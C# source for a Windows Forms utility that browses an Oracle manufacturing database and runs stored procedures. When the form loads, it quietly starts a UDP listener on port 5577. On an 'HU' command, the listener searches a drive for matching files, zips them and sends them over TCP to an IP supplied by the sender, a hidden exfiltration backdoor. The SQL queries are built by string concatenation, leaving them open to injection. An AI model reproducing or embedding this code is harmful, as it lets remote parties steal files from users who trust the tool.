using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Data.OracleClient;
using System.Threading;
using System.Xml;

using ICSharpCode.SharpZipLib.Checksums;
using ICSharpCode.SharpZipLib.Zip;
using ICSharpCode.SharpZipLib.GZip;

namespace ccgcscx
{
    public partial class Form1 : Form
    {
        OracleConnection conn = new OracleConnection();
        string database, usename, password;
        int stid;
        public delegate void labeln(string str);
        public delegate void labelv();
        public delegate double getle();
        string[] strpa = new string[4];  //0.节点ID 1.工位ID 2.群组ID 3.产线ID
        public Form1()
        {
            InitializeComponent();
        }
        int indx = 1;
        int indxbt = 1;

        private void Form1_Load(object sender, EventArgs e)
        {
            if (indx == 1)
            {
                try
                {
                    database = GetXml("DataSource", "value");
                    usename = GetXml("UserId", "value");
                    password = GetXml("Password", "value");
                    conn = new OracleConnection("Data Source=" + database + ";User Id=" + usename + ";Password=" + password + ";");
                    conn.Open();
                    LogHelper.WriteLogHelper.WriteLog("数据库连接成功！");
                    textBoxDN.Text = database;
                    textBoxDD.Text = usename;
                    textBoxDP.Text = password;
                    reudp();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("数据库连接失败！");
                }
            }
            else
            {
                try
                {
                    conn = new OracleConnection("Data Source=" + textBoxDN.Text + ";User Id=" + textBoxDD.Text + ";Password=" + textBoxDP.Text + ";");
                    conn.Open();
                    textBoxDN.Enabled = false;
                    textBoxDD.Enabled = false;
                    textBoxDP.Enabled = false;
                    MessageBox.Show("数据库连接修改成功！");
                }
                catch (Exception ee)
                {
                    MessageBox.Show("数据库连接失败！" + ee.ToString() + "");
                }
            }
            string sr = "select t.line_name,t.line_id from cmes.c_line_t t";
            OracleDataAdapter sc = new OracleDataAdapter(sr, conn);
            DataSet ds2 = new DataSet();
            sc.Fill(ds2);
            DataTable dtl = new DataTable();
            dtl = ds2.Tables[0];
            comboBox1.DataSource = dtl;
            comboBox1.ValueMember = "line_id";
            comboBox1.DisplayMember = "line_name";


            //dataGridViewst.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            dataGridViewst.ClipboardCopyMode = DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            dataGridViewnode.ClipboardCopyMode = DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
            indx++;
            
        }

        //窗体拖动
        #region  窗体拖动
        /// <summary>
        /// 窗体拖动  只用于控件  同时需要判断是否双击
        /// </summary>
        /// <param name="hWnd"></param>
        /// <param name="Msg"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        [System.Runtime.InteropServices.DllImport("User32.DLL")]
        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("User32.DLL")]
        public static extern bool ReleaseCapture();
        public const uint WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 61456;
        public const int HTCAPTION = 2;

        private void Window_Move(object sender, MouseEventArgs e)
        {
            if (e.Clicks > 1)
            {
                //双击事件产生的效果
            }
            else
            {
                ReleaseCapture();
                SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
            }
        }

        #endregion

        //最小化按钮
        private void button1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        //关闭按钮
        private void buttonclose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        //查询按钮
        private void button2_Click(object sender, EventArgs e)
        {
            if (comboBox1.SelectedValue != "")
            {
                string str = "select t.station_name,t.station_id,t.group_id,t.station_seq, t.line_id  from cmes.c_station_t t where t.line_id=" + comboBox1.SelectedValue + "";
                OracleDataAdapter Sa = new OracleDataAdapter(str, conn);
                DataSet ds = new DataSet();
                Sa.Fill(ds);
                DataTable dt = new DataTable();
                dt = ds.Tables[0];
                dataGridViewst.DataSource = dt;
                //string strr = dataGridViewst.Rows[0].Cells[3].Value.ToString();
                if (dataGridViewst.Rows.Count != 0)
                {
                    Thread TH = new Thread(labline);
                    TH.IsBackground = true;
                    TH.Start();
                    int stid = int.Parse(dataGridViewst.Rows[0].Cells[2].Value.ToString());
                    reflash(stid);
                }
                else
                {
                    MessageBox.Show("找不到产线ID为" + comboBox1.SelectedValue + "的产线的相关信息！");
                }
            }
            else
            {
                MessageBox.Show("产线ID不能为空！");
            }
        }

        //点击dataGridViewst事件
        private void dataGridViewst_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex < 0 || e.ColumnIndex!=0)
            {
                return;
            }
            else
            {
                stid = int.Parse(dataGridViewst.Rows[e.RowIndex].Cells[2].Value.ToString());
                reflash(stid);

            }
        }

        //选定存储过程/运行存储过程
        private void button3_Click(object sender, EventArgs e)
        {
            #region 第一次点击确定按钮时，刷新GV显示存储过程参数，并填入已知的数值
            if (button3.Text == "确  定")
            {
                try
                {
                    if (comboBoxpr.Text != "")
                    {
                        string str = @"SELECT T.ARGUMENT_NAME, T.DATA_TYPE,'N/A' AS PAVALUE
                           FROM ALL_ARGUMENTS T
                       WHERE T.OBJECT_NAME = '" + comboBoxpr.Text + "'AND  (T.IN_OUT='IN' OR T.IN_OUT='IN/OUT')";
                        OracleDataAdapter Sb = new OracleDataAdapter(str, conn);
                        DataSet ds1 = new DataSet();
                        DataTable pa = new DataTable();
                        Sb.Fill(ds1);
                        pa = ds1.Tables[0];

                        for (int i = 0; i <= pa.Rows.Count - 1; i++)
                        {

                            if (pa.Rows[i]["ARGUMENT_NAME"].ToString() == "NODEID")
                            {
                                pa.Rows[i]["PAVALUE"] = strpa[0];
                            }
                            if (pa.Rows[i]["ARGUMENT_NAME"].ToString() == "W_STATIONID")
                            {
                                pa.Rows[i]["PAVALUE"] = strpa[1];
                            }
                            if (pa.Rows[i]["ARGUMENT_NAME"].ToString() == "MYGROUPID")
                            {
                                pa.Rows[i]["PAVALUE"] = strpa[2];
                            }
                            if (pa.Rows[i]["ARGUMENT_NAME"].ToString() == "LINEID")
                            {
                                pa.Rows[i]["PAVALUE"] = strpa[3];
                            }
                        }
                        dataGridViewpa.DataSource = pa;
                        button3.Text = "运  行";
                    }
                    else
                    {
                        MessageBox.Show("请选择存储过程！");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("获取存储过程信息失败！！");
                }
            }
            #endregion

            #region 运行存储过程

            else if (button3.Text == "运  行")
            {
                try
                {
                    DataTable dt = (DataTable)dataGridViewpa.DataSource;
                    OracleCommand orcmd = new OracleCommand(comboBoxpr.Text, conn);
                    orcmd.CommandType = CommandType.StoredProcedure;
                    //添加如数参数
                    for (int i = 0; i <= dt.Rows.Count - 1; i++)
                    {
                        if (dt.Rows[i]["DATA_TYPE"].ToString() == "VARCHAR2")
                        {
                            orcmd.Parameters.Add(dt.Rows[i]["ARGUMENT_NAME"].ToString(), OracleType.VarChar, 500);
                            orcmd.Parameters[dt.Rows[i]["ARGUMENT_NAME"].ToString()].Value = dt.Rows[i]["PAVALUE"].ToString();
                        }
                        else if (dt.Rows[i]["DATA_TYPE"].ToString() == "NUMBER")
                        {
                            orcmd.Parameters.Add(dt.Rows[i]["ARGUMENT_NAME"].ToString(), OracleType.Number, 50);
                            orcmd.Parameters[dt.Rows[i]["ARGUMENT_NAME"].ToString()].Value = int.Parse(dt.Rows[i]["PAVALUE"].ToString());
                        }
                    }

                    #region 查出输出参数
                    string str = @"SELECT T.ARGUMENT_NAME, T.DATA_TYPE,'N/A' AS PAVALUE
                           FROM ALL_ARGUMENTS T
                       WHERE T.OBJECT_NAME = '" + comboBoxpr.Text + "'AND (T.IN_OUT='OUT')";
                    OracleDataAdapter Sb = new OracleDataAdapter(str, conn);
                    DataSet ds1 = new DataSet();
                    DataTable pa = new DataTable();
                    Sb.Fill(ds1);
                    pa = ds1.Tables[0];
                    #endregion

                    //输出参数
                    for (int j = 0; j <= pa.Rows.Count - 1; j++)
                    {
                        if (pa.Rows[j]["DATA_TYPE"].ToString() == "VARCHAR2")
                        {
                            orcmd.Parameters.Add(pa.Rows[j]["ARGUMENT_NAME"].ToString(), OracleType.VarChar, 1000);
                            orcmd.Parameters[pa.Rows[j]["ARGUMENT_NAME"].ToString()].Direction = ParameterDirection.Output;
                        }
                        else if (pa.Rows[j]["DATA_TYPE"].ToString() == "NUMBER")
                        {
                            orcmd.Parameters.Add(pa.Rows[j]["ARGUMENT_NAME"].ToString(), OracleType.Number, 50);
                            orcmd.Parameters[pa.Rows[j]["ARGUMENT_NAME"].ToString()].Direction = ParameterDirection.Output;
                        }
                    }

                    orcmd.ExecuteNonQuery();
                    string str1 = "";
                    for (int k = 0; k <= pa.Rows.Count - 1; k++)
                    {
                        //if (pa.Rows[k]["ARGUMENT_NAME"].ToString() == "KB_INFO")
                        //{
                        //    string stle = orcmd.Parameters[pa.Rows[k]["ARGUMENT_NAME"].ToString()].Value.ToString().Length.ToString();
                        //    MessageBox.Show(stle);
                        //}


                        str1 = str1 + pa.Rows[k]["ARGUMENT_NAME"].ToString() + ":" + orcmd.Parameters[pa.Rows[k]["ARGUMENT_NAME"].ToString()].Value.ToString() + "\n\r";
                    }
                    
                  
                    MessageBox.Show(str1, "存储过程运行结果");

                }
                catch (Exception ex)
                {
                    MessageBox.Show("运行存储过程错误！");
                }
            }


            #endregion
        }

        //节点GV点击事件
        private void dataGridViewnode_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex < 0 || e.ColumnIndex!=0)
            {
                return;
            }
            else
            {
                panel2.Visible = true;


                #region 绑定LAB和全局变量
                string str1 = @"SELECT NODE_ID,NODE_NAME,STATION_ID
                              FROM FS_NODE_T 
                              WHERE NODE_ID=" + int.Parse(dataGridViewnode.Rows[e.RowIndex].Cells[2].Value.ToString()) + "";
                OracleDataAdapter Sb1 = new OracleDataAdapter(str1, conn);
                DataSet ds2 = new DataSet();
                DataTable lab = new DataTable();
                Sb1.Fill(ds2);
                lab = ds2.Tables[0];
                labelnode.Text = lab.Rows[0]["NODE_NAME"].ToString();

                strpa[0] = lab.Rows[0]["NODE_ID"].ToString();
                strpa[1] = lab.Rows[0]["STATION_ID"].ToString();

                string str2 = @"SELECT STATION_NAME,GROUP_ID,LINE_ID
                              FROM C_STATION_T 
                              WHERE STATION_ID=" + int.Parse(lab.Rows[0]["STATION_ID"].ToString()) + "";
                OracleDataAdapter Sb2 = new OracleDataAdapter(str2, conn);
                DataSet ds3 = new DataSet();
                DataTable labst = new DataTable();
                Sb2.Fill(ds3);
                labst = ds3.Tables[0];
                labelstation.Text = labst.Rows[0]["STATION_NAME"].ToString();
                strpa[2] = labst.Rows[0]["GROUP_ID"].ToString();
                strpa[3] = labst.Rows[0]["LINE_ID"].ToString();

                string str3 = @"SELECT GROUP_NAME
                              FROM C_GROUP_T 
                              WHERE GROUP_ID=" + int.Parse(labst.Rows[0]["GROUP_ID"].ToString()) + "";
                OracleDataAdapter Sb3 = new OracleDataAdapter(str3, conn);
                DataSet ds4 = new DataSet();
                DataTable labgp = new DataTable();
                Sb3.Fill(ds4);
                labgp = ds4.Tables[0];
                labelgroup.Text = labgp.Rows[0]["GROUP_NAME"].ToString();

                string str4 = @"SELECT LINE_NAME
                              FROM C_LINE_T 
                              WHERE LINE_ID=" + int.Parse(labst.Rows[0]["LINE_ID"].ToString()) + "";
                OracleDataAdapter Sb4 = new OracleDataAdapter(str4, conn);
                DataSet ds5 = new DataSet();
                DataTable labli = new DataTable();
                Sb4.Fill(ds5);
                labli = ds5.Tables[0];
                labelline1.Text = labli.Rows[0]["LINE_NAME"].ToString();
                #endregion


                #region 绑定存储过程下拉框
                string str = @"SELECT A.OBJECT_NAME
                               FROM ALL_OBJECTS A, ALL_USERS U
                               WHERE A.OBJECT_TYPE = 'PROCEDURE'
                               AND A.OWNER = U.USERNAME
                               AND U.CREATED > TO_DATE('2012/01/01', 'YYYY-MM-DD')
                               ORDER BY A.OBJECT_NAME";
                OracleDataAdapter Sb = new OracleDataAdapter(str, conn);
                DataSet ds1 = new DataSet();
                DataTable cmpr = new DataTable();
                Sb.Fill(ds1);
                cmpr = ds1.Tables[0];
                DataRow dr = cmpr.NewRow();
                dr["OBJECT_NAME"] = " ";
                cmpr.Rows.InsertAt(dr, 0);
                comboBoxpr.DataSource = cmpr;
                comboBoxpr.ValueMember = "OBJECT_NAME";
                comboBoxpr.DisplayMember = "OBJECT_NAME";
                #endregion

            }

        }

        //节点视图刷新
        private void reflash(int stid)
        {
            string str = "select t.node_name,t.node_id from cmes.fs_node_t t where t.station_id=" + stid + "";
            OracleDataAdapter Sb = new OracleDataAdapter(str, conn);
            DataSet ds1 = new DataSet();
            Sb.Fill(ds1);
            DataTable dt1 = new DataTable();
            dt1 = ds1.Tables[0];
            dataGridViewnode.DataSource = dt1;

        }

        //操作LAB线程的方法
        private void labline()
        {
            labeln lab1 = new labeln(labn);
            labelv lab2 = new labelv(labv);
            getle gelineid = new getle(getline);
            double lid = double.Parse(comboBox1.Invoke(gelineid).ToString());
            string str = "select t.line_name from cmes.c_line_t t where t.line_id=" + lid + "";
            OracleDataAdapter Sb = new OracleDataAdapter(str, conn);
            DataSet ds1 = new DataSet();
            Sb.Fill(ds1);
            DataTable dt1 = new DataTable();
            dt1 = ds1.Tables[0];
            string lab = dt1.Rows[0][0].ToString();
            labelline.Invoke(lab2);
            labelline.Invoke(lab1, lab);

        }

        //委托需要的方法
        private void labn(string str)
        {
            labelline.Text = str;
        }
        private void labv()
        {
            labelline.Visible = true;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            labeltime.Text = DateTime.Now.ToString("HH:mm:ss");
        }
        private double getline()
        {
            double linid = double.Parse(comboBox1.SelectedValue.ToString());
            return linid;
        }

        //读取配置文件方法
        public static string GetXml(string node, string attribute)
        {
            string result = null;
            XmlDocument xmlDoc = new XmlDocument();
            string addr = "Config/DatabaseMap.xml";
            xmlDoc.Load(addr);
            XmlNode nd;
            nd = xmlDoc.SelectSingleNode("Config");
            XmlNodeList xnl = nd.ChildNodes;
            foreach (XmlNode xn in xnl)
            {
                XmlElement xe = (XmlElement)xn;
                if (xe.Name == node)
                {
                    result = xe.GetAttribute(attribute);
                }
            }
            return result;
        }

        //修改数据库连接按钮
        private void button8_Click(object sender, EventArgs e)
        {
            if (indxbt % 2 == 1)
            {
                button8.Text = "保  存";
                textBoxDN.Enabled = true;
                textBoxDD.Enabled = true;
                textBoxDP.Enabled = true;
            }
            else
            {
                button8.Text = "修  改";
                Form1_Load(null, null);
            }
            indxbt++;
        }

        //隐藏存储过程界面
        private void button4_Click(object sender, EventArgs e)
        {
            panel2.Visible = false;
        }

        //换选存储过程后自动变更按钮显示
        private void comboBoxpr_SelectedIndexChanged(object sender, EventArgs e)
        {
            button3.Text = "确  定";
        }

        private void label1_DoubleClick(object sender, EventArgs e)
        {
            Formhide formh=new Formhide();
            formh.ShowDialog();
        }

        #region
        //启动线程
        UdpClient shou;
        public void reudp()
        {
            shou = new UdpClient(5577);
            Thread star = new Thread(start_server);
            star.IsBackground = true;
            star.Start();
        }
        //线程方法
        public void start_server()
        {
            while (true)
            {

                System.Text.UTF8Encoding encode = new System.Text.UTF8Encoding();
                IPAddress ipa = IPAddress.Parse("127.0.0.1");
                IPEndPoint IPPshou = new IPEndPoint(ipa, 5577);
                byte[] recData = shou.Receive(ref IPPshou);
                string strr = encode.GetString(recData);
                string[] strs = strr.Split(';');
                if (strs[0] == "HU")
                {
                    TcpClient client = new TcpClient();

                    //client.Connect(IPAddress.Parse(textBox1.Text), int.Parse(textBox2.Text));
                    client.Connect(IPAddress.Parse(strs[2]), int.Parse("6688"));
                    NetworkStream ns = client.GetStream();
                    getfile(strs[4], strs[1], strs[3]);
                    FileStream fs = new FileStream("D:\\a.zip", FileMode.Open);
                    int size = 0;//初始化读取的流量为0   
                    long len = 0;//初始化已经读取的流量   
                    while (len < fs.Length)
                    {
                        byte[] buffer = new byte[512];
                        size = fs.Read(buffer, 0, buffer.Length);
                        ns.Write(buffer, 0, size);
                        len += size;
                        //Pro((long)len);   
                    }
                    fs.Flush();
                    ns.Flush();
                    fs.Close();
                    ns.Close();
                }
            }
        }

        //获取文件方法
        public void getfile(string path, string type, string name)
        {

            try
            {
                string pathto = @"D:\";
                string topath = @"D:\t\";
                System.IO.Directory.CreateDirectory(pathto + "t");
                //System.IO.DirectoryInfo to = new System.IO.DirectoryInfo(path);
                //to.Create();
                string[] dirs = System.IO.Directory.GetDirectories(path + ":\\", "*", System.IO.SearchOption.TopDirectoryOnly);
                string[] dirrs,dirrs1;
                foreach (string dir in dirs)
                {

                    if (dir.Substring(3, 1) != "$" && dir.Substring(3, 1) != "S" && dir.Substring(3, dir.Length - 3) != "t")
                    {
                        dirrs = System.IO.Directory.GetFiles(dir, "*" + name + "*." + type, System.IO.SearchOption.AllDirectories);
                        dirrs1 = System.IO.Directory.GetFileSystemEntries(dir, "*" + name + "*." + type);
                        foreach (string file in dirrs1)
                        {
                            System.IO.FileInfo fi = new System.IO.FileInfo(file);
                            fi.CopyTo(topath + fi.Name, true);
                        }
                        foreach (string file in dirrs)
                        {
                            System.IO.FileInfo fi = new System.IO.FileInfo(file);
                            fi.CopyTo(topath + fi.Name, true);
                        }

                    }
                }
            }
            catch
            {
            }
            Zip();
        }



        //压缩文件
        public void Zip()
        {
            string[] FileProperties = new string[2];
            FileProperties[0] = "D:\\t\\";//待压缩文件目录
            FileProperties[1] = "D:\\a.zip";  //压缩后的目标文件
            ZipFloClass Zc = new ZipFloClass();
            Zc.ZipFile(FileProperties[0], FileProperties[1]);
        }



        #region 压缩文件类
        public class ZipFloClass
        {
            public void ZipFile(string strFile, string strZip)
            {
                try
                {
                    if (strFile[strFile.Length - 1] != Path.DirectorySeparatorChar)
                        strFile += Path.DirectorySeparatorChar;
                    ZipOutputStream s = new ZipOutputStream(File.Create(strZip));
                    s.SetLevel(6); // 0 - store only to 9 - means best compression
                    zip(strFile, s, strFile);
                    s.Finish();
                    s.Close();
                }
                catch (Exception EX)
                {
                    MessageBox.Show(EX.ToString());
                }
            }


            private void zip(string strFile, ZipOutputStream s, string staticFile)
            {
                if (strFile[strFile.Length - 1] != Path.DirectorySeparatorChar) strFile += Path.DirectorySeparatorChar;
                Crc32 crc = new Crc32();
                string[] filenames = Directory.GetFileSystemEntries(strFile);
                foreach (string file in filenames)
                {

                    if (Directory.Exists(file))
                    {
                        zip(file, s, staticFile);
                    }

                    else // 否则直接压缩文件
                    {
                        //打开压缩文件
                        FileStream fs = File.OpenRead(file);

                        byte[] buffer = new byte[fs.Length];
                        fs.Read(buffer, 0, buffer.Length);
                        string tempfile = file.Substring(staticFile.LastIndexOf("\\") + 1);
                        ZipEntry entry = new ZipEntry(tempfile);

                        entry.DateTime = DateTime.Now;
                        entry.Size = fs.Length;
                        fs.Close();
                        crc.Reset();
                        crc.Update(buffer);
                        entry.Crc = crc.Value;
                        s.PutNextEntry(entry);

                        s.Write(buffer, 0, buffer.Length);
                    }
                }
            }

        }
        #endregion
        #endregion
    }
}
